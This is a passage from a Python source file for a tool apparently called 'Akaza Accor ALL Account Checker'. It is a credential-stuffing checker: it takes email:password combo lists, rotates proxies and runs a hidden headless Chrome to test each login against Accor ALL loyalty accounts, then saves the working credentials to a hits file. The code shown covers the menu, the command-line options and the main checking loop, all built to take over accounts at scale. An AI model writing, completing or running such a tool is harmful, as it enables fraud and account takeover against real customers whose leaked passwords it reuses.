          f"{C.RESET}")
    print(f"        {C.GREY}        clicked, URL transitions, captured API responses)."
          f"{C.RESET}")
    print(f"        {C.GREY}  OFF = Only print the final ALIVE/DEAD line per combo."
          f"{C.RESET}")

    # ── ACTIONS ────────────────────────────────────────────────────────────
    print()
    print(f"  {C.BOLD}{C.WHITE}ACTIONS{C.RESET}")
    print(f"  {C.GREY}{'─' * 30}{C.RESET}")
    print(f"   {C.GREEN}{C.BOLD}[S]{C.RESET} Start checking         {C.GREY}— begin processing the combo list{C.RESET}")
    print(f"   {C.YELLOW}{C.BOLD}[R]{C.RESET} Reset settings         {C.GREY}— wipe all options back to defaults{C.RESET}")
    print(f"   {C.RED}{C.BOLD}[Q]{C.RESET} Quit                   {C.GREY}— exit the program{C.RESET}")
    print()


def _prompt(label, default=None):
    """Single-line prompt with optional default hint, Akaza-styled."""
    extra = f" {C.DIM}[{default}]{C.RESET}" if default else ""
    try:
        return input(f"  {C.CYAN}»{C.RESET} {C.WHITE}{label}{extra}{C.WHITE}:{C.RESET} ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return ''


def _flash(msg, color=C.YELLOW, pause=0.6):
    """Print a transient status line, then briefly pause."""
    print(f"  {color}»{C.RESET} {msg}")


# ─── Menu-based interface ────────────────────────────────────────────────────
async def menu_mode():
    """Fully interactive menu — every option can be flipped on/off or set
    here. No CLI flags required.

    Menu controls:
        [1] Combo source        — set / change the combo list
        [2] Proxy               — set / change the proxy file or single proxy
        [3] CDP url             — connect to an external running Chrome
        [4] Chrome path         — override Chrome executable path
        [5] Hidden Chrome       — toggle headless=new (invisible) on/off
        [6] Block heavy assets  — toggle resource blocking on/off
        [7] Verbose logs        — toggle per-step debug printing on/off
        [S] Start checking      — run the checker with the current settings
        [R] Reset settings      — wipe everything back to defaults
        [Q] Quit                — exit
    """
    s = Settings()

    while True:
        _print_menu(s)
        choice = _prompt("Choose an option").lower()

        # ── Inputs ──────────────────────────────────────────────────────
        if choice == '1':
            v = _prompt("Combo file path  OR  single 'email:pass'")
            s.combo_source = v or None
            _flash("Combo source updated." if v else "Combo source cleared.")

        elif choice == '2':
            v = _prompt("Proxy file path  OR  single proxy string  (blank = none)")
            s.proxy_arg = v or None
            _flash("Proxy updated." if v else "Proxy cleared.")

        elif choice == '3':
            v = _prompt("CDP URL  (e.g. http://localhost:29229, blank = none)")
            s.cdp_arg = v or None
            _flash("CDP url updated." if v else "CDP url cleared.")

        elif choice == '4':
            v = _prompt("Path to Chrome executable  (blank = auto-detect)")
            s.chrome_path = v or None
            _flash("Chrome path updated." if v else "Chrome path cleared (auto-detect).")

        # ── Toggles ─────────────────────────────────────────────────────
        elif choice == '5':
            s.headless = not s.headless
            _flash(f"Hidden Chrome: {'ON' if s.headless else 'OFF'}",
                   C.GREEN if s.headless else C.RED)

        elif choice == '6':
            s.block_resources = not s.block_resources
            _flash(f"Block heavy assets: {'ON' if s.block_resources else 'OFF'}",
                   C.GREEN if s.block_resources else C.RED)

        elif choice == '7':
            s.verbose = not s.verbose
            _flash(f"Verbose logs: {'ON' if s.verbose else 'OFF'}",
                   C.GREEN if s.verbose else C.RED)

        # ── Actions ─────────────────────────────────────────────────────
        elif choice == 'r':
            s = Settings()
            _flash("All settings reset to defaults.", C.YELLOW)

        elif choice == 's':
            if not s.combo_source:
                print(f"  {C.RED}!{C.RESET} You need to set a combo source first "
                      f"(option {C.CYAN}[1]{C.RESET}).")
                input(f"  {C.DIM}Press Enter to continue...{C.RESET}")
                continue
            print()
            print(f"{C.CYAN}{'─' * 68}{C.RESET}")
            await run_checker(
                s.combo_source,
                s.proxy_arg,
                s.cdp_arg,
                s.chrome_path,
                s.verbose,
                headless=s.headless,
                block_resources=s.block_resources,
            )
            print(f"{C.CYAN}{'─' * 68}{C.RESET}")
            input(f"\n  {C.DIM}Press Enter to return to menu...{C.RESET}")

        elif choice == 'q' or choice == 'exit':
            print(f"\n  {C.MAGENTA}{C.BOLD}» Bye! — @akaza_isnt{C.RESET}\n")
            return

        else:
            _flash("Unknown option — pick a number or letter from the menu.", C.RED)
            await asyncio.sleep(0.5)


# ─── Main entry point ────────────────────────────────────────────────────────
async def main():
    """Entry point.

    By default, running the script with no arguments drops you into the
    fully interactive menu (recommended). For automation / scripting you
    can still pass CLI flags — they map 1:1 to menu options:

        -c / --combo <file|email:pass>   Same as menu option [1].
        -p / --proxy <file|proxy>        Same as menu option [2].
        --cdp <url>                      Same as menu option [3].
        --chrome <path>                  Same as menu option [4].
        --show                           Inverts menu option [5] — shows
                                         the Chrome window (default hidden).
        --no-block                       Inverts menu option [6] — loads
                                         all resources (default blocks
                                         images / fonts / media).
        -v / --verbose                   Same as menu option [7] — prints
                                         step-by-step debug info.
    """
    # If command line arguments given, use CLI mode (backwards compatible).
    # Otherwise fall through to the menu.
    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(
            description='Akaza Accor ALL Account Checker',
            epilog='Run without arguments to use the interactive menu.',
        )
        parser.add_argument('-c', '--combo', help='Email:pass combo (single) or combo file path  [menu 1]')
        parser.add_argument('-p', '--proxy', help='Proxy (host:port:user:pass) or proxy file        [menu 2]')
        parser.add_argument('--cdp', help='CDP endpoint, e.g. http://localhost:29229         [menu 3]')
        parser.add_argument('--chrome', help='Path to Chrome executable                           [menu 4]')
        parser.add_argument('--show', action='store_true',
                            help='Show the browser window (default = hidden/headless) [menu 5]')
        parser.add_argument('--no-headless', dest='show', action='store_true',
                            help='Alias of --show')
        parser.add_argument('--no-block', dest='no_block', action='store_true',
                            help='Disable image/font/media blocking (slower)         [menu 6]')
        parser.add_argument('-v', '--verbose', action='store_true',
                            help='Verbose per-step logging                              [menu 7]')
        # Legacy flag — kept so old scripts don't break, but no-op now.
        parser.add_argument('-o', '--output', help=argparse.SUPPRESS)
        args = parser.parse_args()

        await run_checker(
            args.combo,
            args.proxy,
            args.cdp,
            args.chrome,
            args.verbose,
            output_folder="Accor results",
            headless=not args.show,
            block_resources=not args.no_block,
        )
    else:
        # No args → interactive menu.
        await menu_mode()


# ─── Main logic (original) ───────────────────────────────────────────────────
async def run_checker(combo_source, proxy_arg, cdp_arg, chrome_path, verbose, output_folder="Accor results", headless=True, block_resources=True):
    """Core checking routine - reused by CLI and menu."""
    # Create output folder
    os.makedirs(output_folder, exist_ok=True)
    hits_path = os.path.join(output_folder, "hits.txt")
    bad_path = os.path.join(output_folder, "bad.txt")

    # Parse proxy
    proxy = None
    proxies = []
    if proxy_arg:
        if os.path.isfile(proxy_arg):
            with open(proxy_arg) as f:
                proxies = [parse_proxy(l) for l in f if l.strip()]
                proxies = [p for p in proxies if p]
            print(f"[*] Loaded {len(proxies)} proxies")
            proxy = proxies[0] if proxies else None
        else:
            proxy = parse_proxy(proxy_arg)
        if proxy:
            print(f"[*] Proxy: {proxy['host']}:{proxy['port']}")

    # Parse combos
    combos = []
    if combo_source:
        if os.path.isfile(combo_source):
            with open(combo_source) as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        e, pw = line.split(':', 1)
                        combos.append((e.strip(), pw.strip()))
            print(f"[*] Loaded {len(combos)} combos")
        elif ':' in combo_source:
            e, pw = combo_source.split(':', 1)
            combos.append((e.strip(), pw.strip()))
    else:
        # Interactive single combo
        e = input("  Email: ").strip()
        pw = input("  Password: ").strip()
        if e and pw:
            combos.append((e, pw))

    if not combos:
        print("[!] No combos")
        return

    if cdp_arg:
        print(f"[*] Mode: CDP ({cdp_arg})")
    else:
        mode_label = 'Standalone Chrome [HIDDEN - off-screen]' if headless else 'Standalone Chrome [VISIBLE]'
        print(f"[*] Mode: {mode_label}")

    # Prepare output files
    hits_file = open(hits_path, 'a') if hits_path else None
    bad_file = open(bad_path, 'a') if bad_path else None

    alive = dead = 0

    for i, (email, password) in enumerate(combos):
        print(f"\n[{i+1}/{len(combos)}] {email}")

        if cdp_arg:
            result = await check_account_cdp(email, password, cdp_url=cdp_arg, verbose=verbose, block_resources=block_resources)
        else:
            px = proxies[i % len(proxies)] if proxies else proxy
            result = await check_account_standalone(email, password, proxy=px, verbose=verbose, browser_path=chrome_path, headless=headless, block_resources=block_resources)

        print(f"  {format_result(result)}")

        if result['status'] == 'ALIVE':
            alive += 1
            if hits_file:
                hits_file.write(format_result_plain(result) + '\n')
                hits_file.flush()
        else:
            dead += 1
            if bad_file:
                bad_file.write(format_result_plain(result) + '\n')
                bad_file.flush()

    print(f"\n{'='*50}")
    print(f"[*] Done: \033[92m{alive} ALIVE\033[0m / \033[91m{dead} DEAD\033[0m / {len(combos)} Total")
    print(f"[*] Hits saved to: {hits_path}")
    print(f"[*] Bad saved to: {bad_path}")

    if hits_file:
        hits_file.close()
    if bad_file:
        bad_file.close()





# ─── Script entry ────────────────────────────────────────────────────────────
if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n  {C.MAGENTA}» Interrupted. Bye!{C.RESET}")
